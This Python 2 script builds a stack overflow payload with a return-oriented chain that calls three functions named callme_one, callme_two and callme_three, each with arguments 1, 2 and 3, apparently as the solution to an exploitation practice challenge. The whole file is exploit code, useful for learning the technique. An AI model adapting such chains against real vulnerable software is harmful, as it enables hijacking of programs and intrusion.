#!/usr/bin/python2.7
import struct;
x=lambda a:struct.pack('<I', a);

popx3_ret = 0x80488a9
payload = 'D'*40 
payload += 'BBBB'
payload += x(0x080485c0) # Address of callme_one
payload += x(popx3_ret) # pop esi; pop edi; pop ebp; ret;
payload += x(0x1)
payload += x(0x2)
payload += x(0x3)

payload += x(0x08048620) # callme_two
payload += x(popx3_ret)
payload += x(0x1)
payload += x(0x2)
payload += x(0x3)

payload += x(0x080485b0) # callme_three
payload += x(popx3_ret)
payload += x(0x1)
payload += x(0x2)
payload += x(0x3)


print payload
